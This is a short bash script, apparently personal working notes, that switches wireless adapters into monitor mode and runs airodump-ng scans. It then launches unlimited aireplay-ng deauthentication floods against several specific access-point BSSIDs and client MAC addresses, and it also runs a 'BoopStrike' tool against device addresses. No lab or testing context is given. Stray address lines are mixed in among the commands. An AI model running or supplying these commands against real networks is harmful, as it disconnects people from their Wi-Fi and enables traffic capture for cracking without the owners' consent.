#!/bin/bash

#wlan1
sudo iw dev
sudo ip link set wlan1 down
sudo iw wlan1 set monitor control
sudo ip link set wlan1 up
sudo iw dev

sudo iw wlan0 set type managed

#BSSID
airmon-ng start wlan0

airodump-ng wlan1

iwconfig wlan1 channel 1
aireplay-ng -0 0 -a FA:F0:82:AA:10:E4 -c 240A64FE2177 wlan1
38B1DBA8F7BD
aireplay-ng -0 0 -a FA:F0:82:AA:10:E4 -c 38B1DBA8F7BD wlan1
sudo BoopStrike -i wlan1 -t 240A64FE2177 -c 1
sudo BoopStrike -i wlan1 -t 38B1DBA8F7BD -c 1
00:1E:8C:A4:91:EF

aireplay-ng -0 0 -a 00:1E:8C:A4:91:EF -c 38B1DBA8F7BD wlan1
aireplay-ng -0 0 -a 00:1E:8C:A4:91:EF wlan1

40:A5:EF:41:13:C5
aireplay-ng -0 0 -a 40:A5:EF:41:13:C5 wlan1

#wlan0
sudo ip link set wlan0 down
#sudo iw wlan0 set monitor control
sudo iw dev wlan0 interface add wmon0 type monitor
sudo ip link set wlan0 up
sudo ip link set wmon0 up
sudo iw dev

iwconfig wlan0 channel 1
airodump-ng wlan0

aireplay-ng -0 0 -a 00:1E:8C:A4:91:EF -c 38B1DBA8F7BD wlan0
aireplay-ng -0 0 -a 00:1E:8C:A4:91:EF wlan0

